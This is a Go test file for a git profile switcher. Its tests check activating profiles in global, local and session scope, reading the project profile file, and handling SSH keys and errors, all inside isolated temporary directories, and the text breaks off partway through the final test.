package profile

import (
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/justjundana/git-config-manager/internal/config"
	fileSvc "github.com/justjundana/git-config-manager/internal/service/file"
	"github.com/justjundana/git-config-manager/pkg/logger"
)

func isolateGitEnv(t *testing.T) string {
	t.Helper()
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("GIT_CONFIG_GLOBAL", filepath.Join(home, ".gitconfig"))
	t.Setenv("GIT_CONFIG_SYSTEM", "/dev/null")
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(home, ".config"))
	t.Setenv("GIT_CONFIG_NOSYSTEM", "1")
	return home
}

func isolateChdir(t *testing.T, dir string) {
	t.Helper()
	origDir, err := os.Getwd()
	if err != nil {
		t.Fatalf("getwd: %v", err)
	}
	if err := os.Chdir(dir); err != nil {
		t.Fatalf("chdir %s: %v", dir, err)
	}
	t.Cleanup(func() { os.Chdir(origDir) })
}

func newTestSwitcher(t *testing.T) (*Switcher, *Manager, *config.Config) {
	t.Helper()
	dir := t.TempDir()

	// Isolate git environment so no test can touch real config
	t.Setenv("HOME", dir)
	t.Setenv("GIT_CONFIG_GLOBAL", filepath.Join(dir, ".gitconfig"))
	t.Setenv("GIT_CONFIG_SYSTEM", "/dev/null")
	t.Setenv("GIT_CONFIG_NOSYSTEM", "1")
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(dir, ".config"))

	cfg := config.DefaultConfig()
	cfg.ProfilesDir = filepath.Join(dir, "profiles")
	cfg.TemplatesDir = filepath.Join(dir, "templates")
	cfg.CacheDir = filepath.Join(dir, "cache")
	cfg.AutoSwitch.ProjectFile = ".gcm-profile"
	cfg.Advanced.GitCommand = "git"

	if err := os.MkdirAll(cfg.ProfilesDir, 0755); err != nil {
		t.Fatal(err)
	}

	fs := fileSvc.NewService()
	log := logger.New(logger.LevelError, os.Stderr)
	mgr := NewManager(cfg, fs, log)
	sw := NewSwitcher(cfg, mgr, log)
	return sw, mgr, cfg
}

func TestNewSwitcher(t *testing.T) {
	sw, _, _ := newTestSwitcher(t)
	if sw == nil {
		t.Fatal("expected non-nil switcher")
	}
	if sw.cfg == nil {
		t.Error("expected non-nil cfg")
	}
	if sw.manager == nil {
		t.Error("expected non-nil manager")
	}
	if sw.log == nil {
		t.Error("expected non-nil log")
	}
}

func TestCurrent_NoActiveProfile(t *testing.T) {
	sw, _, _ := newTestSwitcher(t)
	_, _, err := sw.Current()
	if err == nil {
		t.Fatal("expected error when no active profile")
	}
}

func TestCurrent_DefaultProfile(t *testing.T) {
	sw, mgr, cfg := newTestSwitcher(t)
	_ = mgr.Create(validProfile("work"))

	// chdir to a non-git temp dir so detectSessionProfile finds nothing
	tmpDir := t.TempDir()
	isolateChdir(t, tmpDir)

	cfg.DefaultProfile = "work"

	name, scope, err := sw.Current()
	if err != nil {
		t.Fatalf("Current: %v", err)
	}
	if name != "work" {
		t.Errorf("name = %q, want work", name)
	}
	if scope != ScopeGlobal {
		t.Errorf("scope = %v, want ScopeGlobal", scope)
	}
}

func TestCurrent_DefaultProfileNotExist(t *testing.T) {
	sw, _, cfg := newTestSwitcher(t)
	cfg.DefaultProfile = "nonexistent"

	_, _, err := sw.Current()
	if err == nil {
		t.Fatal("expected error when default profile doesn't exist")
	}
}

func TestCurrent_LocalProjectFile(t *testing.T) {
	sw, mgr, cfg := newTestSwitcher(t)
	_ = mgr.Create(validProfile("local-proj"))

	// Change to a non-git temp dir so detectSessionProfile() finds nothing
	// and the local project file check takes precedence.
	tmpDir := t.TempDir()
	isolateChdir(t, tmpDir)

	// Write .gcm-profile in the temp directory
	projectFile := filepath.Join(tmpDir, cfg.AutoSwitch.ProjectFile)
	if err := os.WriteFile(projectFile, []byte("local-proj\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	name, scope, err := sw.Current()
	if err != nil {
		t.Fatalf("Current: %v", err)
	}
	if name != "local-proj" {
		t.Errorf("name = %q, want local-proj", name)
	}
	if scope != ScopeLocal {
		t.Errorf("scope = %v, want ScopeLocal", scope)
	}
}

func TestActivate_NotFoundProfile(t *testing.T) {
	sw, _, _ := newTestSwitcher(t)
	err := sw.Activate("nonexistent", ScopeGlobal)
	if err == nil {
		t.Fatal("expected error for nonexistent profile")
	}
}

func TestActivate_LocalScope(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, cfg := newTestSwitcher(t)
	_ = mgr.Create(validProfile("localtest"))

	// Create a git repo so git config --local works
	tmpDir := t.TempDir()
	cmd := exec.Command("git", "init", tmpDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}

	isolateChdir(t, tmpDir)

	err := sw.Activate("localtest", ScopeLocal)
	if err != nil {
		t.Fatalf("Activate local: %v", err)
	}

	// Verify .gcm-profile was written
	data, err := os.ReadFile(filepath.Join(tmpDir, cfg.AutoSwitch.ProjectFile))
	if err != nil {
		t.Fatalf("reading project file: %v", err)
	}
	if got := string(data); got != "localtest\n" {
		t.Errorf("project file content = %q, want %q", got, "localtest\n")
	}

	// Usage should have incremented
	p, _ := mgr.Get("localtest")
	if p.Metadata.UsageCount != 1 {
		t.Errorf("UsageCount = %d, want 1", p.Metadata.UsageCount)
	}
}

func TestRefresh_NoProfile(t *testing.T) {
	sw, _, _ := newTestSwitcher(t)
	// Refresh with no active profile should not error
	if err := sw.Refresh(); err != nil {
		t.Fatalf("Refresh: %v", err)
	}
}
func TestActivate_GlobalScope(t *testing.T) {
	sw, mgr, _ := newTestSwitcher(t)
	mgr.Create(validProfile("globaltest"))

	// Fully isolate git environment
	tmpHome := isolateGitEnv(t)
	os.MkdirAll(filepath.Join(tmpHome, ".gcm"), 0755)

	err := sw.Activate("globaltest", ScopeGlobal)
	if err != nil {
		t.Fatalf("Activate global: %v", err)
	}
}

func TestActivate_SessionScope(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, _ := newTestSwitcher(t)

	// Create a real git repo for session scope
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}

	isolateChdir(t, gitDir)

	mgr.Create(validProfile("sessiontest"))

	err := sw.Activate("sessiontest", ScopeSession)
	if err != nil {
		t.Fatalf("Activate session: %v", err)
	}
}

func TestActivate_NotFound(t *testing.T) {
	sw, _, _ := newTestSwitcher(t)
	err := sw.Activate("nonexistent", ScopeGlobal)
	if err == nil {
		t.Fatal("expected error for nonexistent profile")
	}
}

func TestCurrent_GlobalDefault(t *testing.T) {
	sw, mgr, cfg := newTestSwitcher(t)
	mgr.Create(validProfile("default"))

	// chdir to a non-git temp dir so detectSessionProfile finds nothing
	tmpDir := t.TempDir()
	isolateChdir(t, tmpDir)

	cfg.DefaultProfile = "default"

	name, scope, err := sw.Current()
	if err != nil {
		t.Fatalf("Current: %v", err)
	}
	if name != "default" {
		t.Errorf("name = %q, want %q", name, "default")
	}
	if scope != ScopeGlobal {
		t.Errorf("scope = %v, want ScopeGlobal", scope)
	}
}

func TestRefresh_WithActiveProfile(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, cfg := newTestSwitcher(t)
	mgr.Create(validProfile("refreshme"))
	cfg.DefaultProfile = "refreshme"

	// Isolate: use a temp git repo and temp global config
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}
	isolateChdir(t, gitDir)
	t.Setenv("GIT_CONFIG_GLOBAL", filepath.Join(t.TempDir(), "gitconfig"))

	err := sw.Refresh()
	// May fail due to config save, but exercises the code path
	_ = err
}

func TestScopeString(t *testing.T) {
	if ScopeGlobal.String() != "global" {
		t.Errorf("ScopeGlobal.String() = %q", ScopeGlobal.String())
	}
	if ScopeLocal.String() != "local" {
		t.Errorf("ScopeLocal.String() = %q", ScopeLocal.String())
	}
	if ScopeSession.String() != "session" {
		t.Errorf("ScopeSession.String() = %q", ScopeSession.String())
	}
}

func TestActivate_LocalInGitRepo(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, _ := newTestSwitcher(t)

	// Create a git repo in a temp dir
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}

	// cd into git dir
	isolateChdir(t, gitDir)

	p := &Profile{
		Name: "gitlocal",
		Git: GitConfig{
			User:    GitUser{Name: "Local User", Email: "local@test.com"},
			Core:    GitCore{Editor: "vim"},
			Commit:  GitCommit{GPGSign: BoolPtr(false)},
			Pull:    GitPull{Rebase: "true"},
			Push:    GitPush{Default: "current", FollowTags: BoolPtr(true), AutoSetupRemote: BoolPtr(true)},
			Aliases: map[string]string{"co": "checkout"},
			Custom:  map[string]string{"color.ui": "auto"},
		},
	}
	if err := mgr.Create(p); err != nil {
		t.Fatalf("create: %v", err)
	}

	if err := sw.Activate("gitlocal", ScopeLocal); err != nil {
		t.Fatalf("activate local: %v", err)
	}

	// Verify git config was applied
	out, err := exec.Command("git", "config", "--local", "user.name").CombinedOutput()
	if err != nil {
		t.Fatalf("git config user.name: %v", err)
	}
	if got := string(out); got != "Local User\n" {
		t.Errorf("user.name = %q, want 'Local User'", got)
	}

	// Verify .gcm-profile file was created
	data, err := os.ReadFile(filepath.Join(gitDir, ".gcm-profile"))
	if err != nil {
		t.Fatalf("read .gcm-profile: %v", err)
	}
	if got := string(data); got != "gitlocal\n" {
		t.Errorf(".gcm-profile = %q, want 'gitlocal\\n'", got)
	}
}

func TestActivate_GlobalScope_FullProfile(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, cfg := newTestSwitcher(t)

	// Fully isolate git environment
	tmpHome := isolateGitEnv(t)

	// Redirect config save to temp dir
	cfg.CacheDir = filepath.Join(tmpHome, ".gcm")
	os.MkdirAll(cfg.CacheDir, 0755)

	p := &Profile{
		Name: "globalfull",
		Git: GitConfig{
			User:   GitUser{Name: "Global User", Email: "global@test.com", SigningKey: "ABCD1234"},
			Core:   GitCore{AutoCRLF: "false", EOL: "lf"},
			Commit: GitCommit{Template: "/tmp/commit-msg"},
		},
	}
	if err := mgr.Create(p); err != nil {
		t.Fatalf("create: %v", err)
	}

	err := sw.Activate("globalfull", ScopeGlobal)
	if err != nil {
		t.Fatalf("activate global: %v", err)
	}

	// Verify
	out, _ := exec.Command("git", "config", "--global", "user.email").CombinedOutput()
	if got := string(out); got != "global@test.com\n" {
		t.Errorf("user.email = %q", got)
	}
}

func TestCurrent_LocalProfileFile(t *testing.T) {
	sw, mgr, cfg := newTestSwitcher(t)

	// Create profile
	mgr.Create(&Profile{
		Name: "localcurrent",
		Git:  GitConfig{User: GitUser{Name: "LC", Email: "lc@test.com"}},
	})

	// Create .gcm-profile in cwd
	dir := t.TempDir()
	isolateChdir(t, dir)

	os.WriteFile(filepath.Join(dir, cfg.AutoSwitch.ProjectFile), []byte("localcurrent\n"), 0644)

	name, scope, err := sw.Current()
	if err != nil {
		t.Fatalf("current: %v", err)
	}
	if name != "localcurrent" {
		t.Errorf("name = %q, want 'localcurrent'", name)
	}
	if scope != ScopeLocal {
		t.Errorf("scope = %v, want ScopeLocal", scope)
	}
}

func TestActivate_SessionScope_InGitRepo(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, _ := newTestSwitcher(t)

	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}

	isolateChdir(t, gitDir)

	mgr.Create(validProfile("sessiongit"))
	err := sw.Activate("sessiongit", ScopeSession)
	if err != nil {
		t.Fatalf("Activate session: %v", err)
	}

	// Verify git config was applied locally
	out, err := exec.Command("git", "config", "--local", "user.email").CombinedOutput()
	if err != nil {
		t.Fatalf("git config: %v", err)
	}
	if got := strings.TrimSpace(string(out)); got != "test@example.com" {
		t.Errorf("user.email = %q, want test@example.com", got)
	}
}

func TestActivate_GlobalScope_AllOptionalFields(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, cfg := newTestSwitcher(t)

	tmpHome := isolateGitEnv(t)
	cfg.CacheDir = filepath.Join(tmpHome, ".gcm")
	os.MkdirAll(cfg.CacheDir, 0755)

	p := &Profile{
		Name: "allopts",
		Git: GitConfig{
			User:    GitUser{Name: "All Opts User", Email: "allopts@test.com", SigningKey: "ABC123"},
			Core:    GitCore{Editor: "nano", AutoCRLF: "input", EOL: "lf"},
			Commit:  GitCommit{GPGSign: BoolPtr(true), Template: "/tmp/my-template"},
			Pull:    GitPull{Rebase: "true", FF: "only"},
			Push:    GitPush{Default: "simple", FollowTags: BoolPtr(true), AutoSetupRemote: BoolPtr(false)},
			Aliases: map[string]string{"st": "status", "co": "checkout"},
			Custom:  map[string]string{"color.ui": "always"},
		},
	}
	if err := mgr.Create(p); err != nil {
		t.Fatalf("create: %v", err)
	}

	err := sw.Activate("allopts", ScopeGlobal)
	if err != nil {
		t.Fatalf("activate: %v", err)
	}

	// Verify several config values
	checks := map[string]string{
		"user.name":            "All Opts User",
		"user.email":           "allopts@test.com",
		"user.signingkey":      "ABC123",
		"core.editor":          "nano",
		"core.autocrlf":        "input",
		"core.eol":             "lf",
		"commit.gpgsign":       "true",
		"commit.template":      "/tmp/my-template",
		"pull.rebase":          "true",
		"pull.ff":              "only",
		"push.default":         "simple",
		"push.followTags":      "true",
		"push.autoSetupRemote": "false",
		"alias.st":             "status",
		"alias.co":             "checkout",
		"color.ui":             "always",
	}
	for key, want := range checks {
		out, err := exec.Command("git", "config", "--global", key).CombinedOutput()
		if err != nil {
			t.Errorf("git config --global %s: %v", key, err)
			continue
		}
		if got := strings.TrimSpace(string(out)); got != want {
			t.Errorf("%s = %q, want %q", key, got, want)
		}
	}
}

func TestActivateLocal_UnwritableDir(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, _ := newTestSwitcher(t)
	mgr.Create(validProfile("unwritable"))

	// Create a git repo, then make the dir read-only so .gcm-profile write fails.
	roDir := filepath.Join(t.TempDir(), "readonly")
	os.MkdirAll(roDir, 0o755)
	cmd := exec.Command("git", "init", roDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}

	isolateChdir(t, roDir)

	// Make dir read-only so WriteFile fails (but .git/ remains writable)
	os.Chmod(roDir, 0o555)
	defer os.Chmod(roDir, 0o755)

	err := sw.Activate("unwritable", ScopeLocal)
	if err == nil {
		t.Fatal("expected error writing .gcm-profile to read-only dir")
	}
}

func TestActivate_WithSSHKey(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, _ := newTestSwitcher(t)

	// Create a fake SSH key file
	keyDir := t.TempDir()
	keyPath := filepath.Join(keyDir, "id_test")
	os.WriteFile(keyPath, []byte("fake-key"), 0o600)

	loadToAgent := false
	p := &Profile{
		Name: "sshprofile",
		Git:  GitConfig{User: GitUser{Name: "SSH User", Email: "ssh@test.com"}},
		SSH:  &SSHConfig{KeyPath: keyPath, LoadToAgent: &loadToAgent},
	}
	if err := mgr.Create(p); err != nil {
		t.Fatalf("create: %v", err)
	}

	gitDir := t.TempDir()
	exec.Command("git", "init", gitDir).Run()
	isolateChdir(t, gitDir)

	// Should not error - SSH key exists but load_to_agent is false
	err := sw.Activate("sshprofile", ScopeLocal)
	if err != nil {
		t.Fatalf("activate: %v", err)
	}
}

func TestActivate_GlobalScope_GitConfigFails(t *testing.T) {
	sw, mgr, cfg := newTestSwitcher(t)
	// Use a nonexistent git command to force config write failure
	cfg.Advanced.GitCommand = "nonexistent-git-binary-xyz"
	mgr.Create(validProfile("failglobal"))

	err := sw.Activate("failglobal", ScopeGlobal)
	if err == nil {
		t.Fatal("expected error when git config fails globally")
	}
	if !strings.Contains(err.Error(), "activating global") {
		t.Errorf("error = %q, expected 'activating global'", err)
	}
}

func TestActivate_SessionScope_NotInGitRepo(t *testing.T) {
	sw, mgr, _ := newTestSwitcher(t)
	mgr.Create(validProfile("sessionfail"))

	// chdir to temp dir that is NOT a git repo
	tmpDir := t.TempDir()
	isolateChdir(t, tmpDir)

	// Session scope requires writing a session marker inside .git/;
	// if not in a git repo, writeSessionMarker fails.
	err := sw.Activate("sessionfail", ScopeSession)
	// Should error because not in a git repo (cannot write session marker
	// or apply critical git config).
	if err == nil {
		t.Fatal("expected error when activating session outside a git repo")
	}
}

func TestActivate_LocalScope_WriteFailure(t *testing.T) {
	sw, mgr, _ := newTestSwitcher(t)
	mgr.Create(validProfile("writefail"))

	// Create a read-only dir to cause WriteFile failure
	roDir := filepath.Join(t.TempDir(), "readonly")
	os.MkdirAll(roDir, 0o755)
	isolateChdir(t, roDir)

	os.Chmod(roDir, 0o555)
	defer os.Chmod(roDir, 0o755)

	err := sw.Activate("writefail", ScopeLocal)
	if err == nil {
		t.Fatal("expected error writing .gcm-profile to read-only dir")
	}
	if !strings.Contains(err.Error(), "activating local") {
		t.Errorf("error = %q, expected 'activating local'", err)
	}
}

func TestCurrent_LocalProfileNotExist(t *testing.T) {
	sw, _, cfg := newTestSwitcher(t)

	// Write .gcm-profile with a profile name that doesn't exist
	tmpDir := t.TempDir()
	isolateChdir(t, tmpDir)

	os.WriteFile(filepath.Join(tmpDir, cfg.AutoSwitch.ProjectFile), []byte("ghost\n"), 0o644)

	// Should fall through to check global since the local profile doesn't exist
	_, _, err := sw.Current()
	if err == nil {
		t.Fatal("expected error when no valid profile is found")
	}
}

func TestRefresh_WithGlobalProfile(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, cfg := newTestSwitcher(t)
	mgr.Create(validProfile("refreshglobal"))
	cfg.DefaultProfile = "refreshglobal"

	// Isolate: use a temp git repo and temp global config
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}
	isolateChdir(t, gitDir)
	t.Setenv("GIT_CONFIG_GLOBAL", filepath.Join(t.TempDir(), "gitconfig"))

	// Refresh triggers Activate for the current profile
	err := sw.Refresh()
	// May fail due to config save, but exercises the code path
	_ = err
}

func TestActivate_WithSSHKey_LoadToAgent_True(t *testing.T) {
	sw, mgr, _ := newTestSwitcher(t)

	// Create a fake SSH key file
	keyDir := t.TempDir()
	keyPath := filepath.Join(keyDir, "id_test")
	os.WriteFile(keyPath, []byte("fake-key-content"), 0o600)

	loadToAgent := true
	p := &Profile{
		Name: "sshload",
		Git:  GitConfig{User: GitUser{Name: "SSH Load User", Email: "sshload@test.com"}},
		SSH:  &SSHConfig{KeyPath: keyPath, LoadToAgent: &loadToAgent},
	}
	if err := mgr.Create(p); err != nil {
		t.Fatalf("create: %v", err)
	}

	gitDir := t.TempDir()
	exec.Command("git", "init", gitDir).Run()
	isolateChdir(t, gitDir)

	// ssh-add will likely fail with the fake key, but the path is exercised
	err := sw.Activate("sshload", ScopeLocal)
	// The ssh-add failure is logged as warning but shouldn't cause error
	if err != nil {
		t.Fatalf("activate: %v", err)
	}
}

func TestActivate_WithSSHKey_Nonexistent(t *testing.T) {
	sw, mgr, _ := newTestSwitcher(t)

	loadToAgent := true
	p := &Profile{
		Name: "sshnokey",
		Git:  GitConfig{User: GitUser{Name: "No Key", Email: "nokey@test.com"}},
		SSH:  &SSHConfig{KeyPath: "/nonexistent/path/id_ed25519", LoadToAgent: &loadToAgent},
	}
	if err := mgr.Create(p); err != nil {
		t.Fatalf("create: %v", err)
	}

	gitDir := t.TempDir()
	exec.Command("git", "init", gitDir).Run()
	isolateChdir(t, gitDir)

	// Key doesn't exist so ssh-add is skipped
	err := sw.Activate("sshnokey", ScopeLocal)
	if err != nil {
		t.Fatalf("activate: %v", err)
	}
}

func TestActivate_WithSSHKey_NilLoadToAgent(t *testing.T) {
	sw, mgr, _ := newTestSwitcher(t)

	// Create a fake SSH key
	keyDir := t.TempDir()
	keyPath := filepath.Join(keyDir, "id_test")
	os.WriteFile(keyPath, []byte("fake-key"), 0o600)

	p := &Profile{
		Name: "sshnilload",
		Git:  GitConfig{User: GitUser{Name: "Nil Load", Email: "nilload@test.com"}},
		SSH:  &SSHConfig{KeyPath: keyPath, LoadToAgent: nil}, // nil means default to true
	}
	if err := mgr.Create(p); err != nil {
		t.Fatalf("create: %v", err)
	}

	gitDir := t.TempDir()
	exec.Command("git", "init", gitDir).Run()
	isolateChdir(t, gitDir)

	// ssh-add will be attempted (default to true when nil)
	err := sw.Activate("sshnilload", ScopeLocal)
	if err != nil {
		t.Fatalf("activate: %v", err)
	}
}

// --- Filesystem error injection tests for Switcher ---

func TestActivate_GlobalGitConfigUserNameError(t *testing.T) {
	// Use a nonexistent git command so git config user.name fails
	sw, mgr, cfg := newTestSwitcher(t)
	cfg.Advanced.GitCommand = "/nonexistent-git-binary"

	mgr.Create(validProfile("gitfail"))

	err := sw.Activate("gitfail", ScopeGlobal)
	if err == nil {
		t.Fatal("expected error when git binary doesn't exist")
	}
}

func TestActivate_GlobalGitConfigSigningKeyError(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, cfg := newTestSwitcher(t)

	// Use a real git but no HOME so global config fails
	tmpHome := isolateGitEnv(t)
	cfg.CacheDir = filepath.Join(tmpHome, ".gcm")
	os.MkdirAll(cfg.CacheDir, 0755)

	// Profile with signing key to trigger that path
	p := &Profile{
		Name: "signfail",
		Git:  GitConfig{User: GitUser{Name: "S", Email: "s@test.com", SigningKey: "KEY123"}},
	}
	mgr.Create(p)

	// This should succeed or fail gracefully - exercises the signingkey code path
	_ = sw.Activate("signfail", ScopeGlobal)
}

func TestActivate_GlobalGitConfigEmailError(t *testing.T) {
	// Use a script that succeeds for user.name but fails for user.email
	sw, mgr, cfg := newTestSwitcher(t)
	cfg.Advanced.GitCommand = "/nonexistent-git-xyz"

	p := &Profile{
		Name: "emailfail",
		Git:  GitConfig{User: GitUser{Name: "E", Email: "e@test.com"}},
	}
	mgr.Create(p)

	err := sw.Activate("emailfail", ScopeGlobal)
	if err == nil {
		t.Fatal("expected error when git command doesn't exist")
	}
}

func TestCurrent_ReadFileError(t *testing.T) {
	sw, mgr, cfg := newTestSwitcher(t)
	mgr.Create(validProfile("current-err"))

	// Create a .gcm-profile file that is unreadable
	dir := t.TempDir()
	isolateChdir(t, dir)

	profileFile := filepath.Join(dir, cfg.AutoSwitch.ProjectFile)
	os.WriteFile(profileFile, []byte("current-err\n"), 0o000)
	t.Cleanup(func() { os.Chmod(profileFile, 0o644) })

	// ReadFile will fail, so it should fall through to global default
	cfg.DefaultProfile = "current-err"
	name, scope, err := sw.Current()
	if err != nil {
		t.Fatalf("Current: %v", err)
	}
	// Should fall through to global since local file is unreadable
	if scope != ScopeGlobal {
		t.Errorf("scope = %v, want ScopeGlobal (fallback from unreadable local)", scope)
	}
	if name != "current-err" {
		t.Errorf("name = %q, want current-err", name)
	}
}

func TestActivate_GlobalScope_ConfigSaveError(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, cfg := newTestSwitcher(t)

	// Fully isolate git environment
	tmpHome := isolateGitEnv(t)
	cfg.CacheDir = filepath.Join(tmpHome, ".gcm")
	os.MkdirAll(cfg.CacheDir, 0o755)

	mgr.Create(validProfile("cfgsavefail"))

	// Make the GCM config directory unwritable so config.Save() fails
	gcmDir := filepath.Join(tmpHome, ".gcm")
	os.MkdirAll(gcmDir, 0o755)
	os.Chmod(gcmDir, 0o555)
	t.Cleanup(func() { os.Chmod(gcmDir, 0o755) })

	err := sw.Activate("cfgsavefail", ScopeGlobal)
	if err == nil {
		t.Fatal("expected error when config.Save fails")
	}
	if !strings.Contains(err.Error(), "saving config") {
		t.Errorf("error = %q, expected 'saving config'", err)
	}
}

func TestActivate_LocalScope_CwdUnwritable(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, _ := newTestSwitcher(t)
	mgr.Create(validProfile("localfail"))

	// Create a git repo first, then make it read-only so WriteFile fails
	// but git config can still succeed (git stores config inside .git/).
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}

	origDir, _ := os.Getwd()
	if err := os.Chdir(gitDir); err != nil {
		t.Fatal(err)
	}
	// Make the directory read-only so .gcm-profile write fails,
	// but leave .git/ writable so git config --local works.
	os.Chmod(gitDir, 0o555)
	t.Cleanup(func() {
		os.Chmod(gitDir, 0o755)
		os.Chdir(origDir)
	})

	err := sw.Activate("localfail", ScopeLocal)
	if err == nil {
		t.Fatal("expected error when cwd is unwritable")
	}
	if !strings.Contains(err.Error(), "activating local") {
		t.Errorf("error = %q, want 'activating local'", err)
	}
}

func TestActivate_LocalScope_GitConfigFails(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, cfg := newTestSwitcher(t)
	mgr.Create(validProfile("nogit"))

	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}
	isolateChdir(t, gitDir)

	script := filepath.Join(t.TempDir(), "fakegit.sh")
	content := "#!/bin/sh\nif [ \"$1\" = \"rev-parse\" ]; then exec git \"$@\"; fi\nexit 1\n"
	os.WriteFile(script, []byte(content), 0755)
	cfg.Advanced.GitCommand = script

	// Critical fields (user.name, user.email) will fail — activation should error
	err := sw.Activate("nogit", ScopeLocal)
	if err == nil {
		t.Fatal("expected error when critical git config fields fail")
	}
	if !strings.Contains(err.Error(), "failed to apply critical git config") {
		t.Errorf("error = %q, want 'failed to apply critical git config'", err)
	}
}

func TestActivate_LocalScope_NonCriticalFieldSkipped(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, mgr, cfg := newTestSwitcher(t)

	// Create a profile with non-critical fields
	p := &Profile{
		Name: "noncrit",
		Git: GitConfig{
			User: GitUser{Name: "Test", Email: "test@example.com"},
			Core: GitCore{Editor: "vim"},
		},
	}
	mgr.Create(p)

	// Create a git repo
	gitDir := t.TempDir()
	cmd := exec.Command("git", "init", gitDir)
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null")
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init: %v", err)
	}

	isolateChdir(t, gitDir)

	// Create a wrapper script that succeeds for user.name/user.email but fails for core.editor
	script := filepath.Join(t.TempDir(), "fakegit.sh")
	content := "#!/bin/sh\nfor arg in \"$@\"; do\n  case \"$arg\" in core.editor) exit 1;; esac\ndone\nexec git \"$@\"\n"
	os.WriteFile(script, []byte(content), 0755)
	cfg.Advanced.GitCommand = script

	// Activate in local scope — should succeed (non-critical failure is skipped)
	err := sw.Activate("noncrit", ScopeLocal)
	if err != nil {
		t.Fatalf("Activate should succeed when only non-critical fields fail in local scope, got: %v", err)
	}
}

func TestActivate_GlobalScope_NonCriticalFieldFails(t *testing.T) {
	sw, mgr, cfg := newTestSwitcher(t)

	// Create a profile with non-critical fields
	p := &Profile{
		Name: "noncrit-global",
		Git: GitConfig{
			User: GitUser{Name: "Test", Email: "test@example.com"},
			Core: GitCore{Editor: "vim"},
		},
	}
	mgr.Create(p)

	// Create a wrapper script that succeeds for user.name/user.email but fails for core.editor
	script := filepath.Join(t.TempDir(), "fakegit.sh")
	content := "#!/bin/sh\nfor arg in \"$@\"; do\n  case \"$arg\" in core.editor) exit 1;; esac\ndone\nexit 0\n"
	os.WriteFile(script, []byte(content), 0755)
	cfg.Advanced.GitCommand = script

	// Activate in global scope — should fail because non-critical failure in global is an error
	err := sw.Activate("noncrit-global", ScopeGlobal)
	if err == nil {
		t.Fatal("expected error when non-critical git config field fails in global scope")
	}
	if !strings.Contains(err.Error(), "setting core.editor") {
		t.Errorf("error = %q, want contains 'setting core.editor'", err)
	}
}

func TestClearGlobalIdentity(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not found")
	}

	sw, _, _ := newTestSwitcher(t)

	// Use a temporary gitconfig so we don't affect the real one
	home := isolateGitEnv(t)
	_ = home

	// Set some global identity values
	exec.Command("git", "config", "--global", "user.name", "OldUser").Run()
	exec.Command("git", "config", "--global", "user.email", "old@example.com").Run()
	exec.Command("git", "config", "--global", "user.signingkey", "DEADBEEF").Run()

	// ClearGlobalIdentity should unset them
	err := sw.ClearGlobalIdentity()
	if err != nil {
		t.Fatalf("ClearGlobalIdentity: %v", err)
	}

	// Verify they're unset (git config exits non-zero when key doesn't exist)
